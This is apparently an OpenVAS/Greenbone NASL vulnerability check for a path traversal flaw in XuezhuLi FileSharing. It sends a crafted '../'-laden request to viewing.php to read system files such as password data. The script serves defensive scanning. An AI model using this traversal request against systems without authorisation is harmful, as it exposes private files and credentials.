# Copyright (C) 2016 Greenbone Networks GmbH
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-or-later
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.

CPE = "cpe:/a:xuezhuli:xuezhuli_filesharing";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.808176");
  script_version("2021-10-18T13:34:19+0000");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_tag(name:"last_modification", value:"2021-10-18 13:34:19 +0000 (Mon, 18 Oct 2021)");
  script_tag(name:"creation_date", value:"2016-06-27 12:52:04 +0530 (Mon, 27 Jun 2016)");
  script_name("XuezhuLi FileSharing 'filename' Parameter Path Traversal Vulnerability");

  script_tag(name:"summary", value:"XuezhuLi FileSharing is prone to a path traversal
  vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks if it is possible
  to read password information.");

  script_tag(name:"insight", value:"The flaw exists due to an improper validation of user supplied
  input to the 'file_name' parameter in the 'download.php' and 'viewing.php' scripts.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to read
  arbitrary files.");

  script_tag(name:"affected", value:"XuezhuLi FileSharing all versions.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore. General solution
  options are to upgrade to a newer release, disable respective features, remove the product or
  replace the product by another one.");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_tag(name:"qod_type", value:"remote_vul");

  script_xref(name:"URL", value:"https://packetstormsecurity.com/files/137609/xuezhulifilesharing-traversal.txt");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2016 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_xuezhuli_filesharing_http_detect.nasl", "os_detection.nasl");
  script_mandatory_keys("xuezhuli/filesharing/http/detected");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("misc_func.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");
include("os_func.inc");

if(!port = get_app_port(cpe:CPE, service:"www"))
  exit(0);

if(!dir = get_app_location(cpe:CPE, port:port))
  exit(0);

if(dir == "/")
  dir = "";

files = traversal_files();

foreach file(keys(files)) {
  url = dir + "/viewing.php?file_name=" + crap(data:"../", length:3 * 15) + files[file];
  if(http_vuln_check(port:port, url:url, check_header:TRUE, pattern:file)) {
    report = http_report_vuln_url(port:port, url:url);
    security_message(port:port, data:report);
    exit(0);
  }
}

exit(99);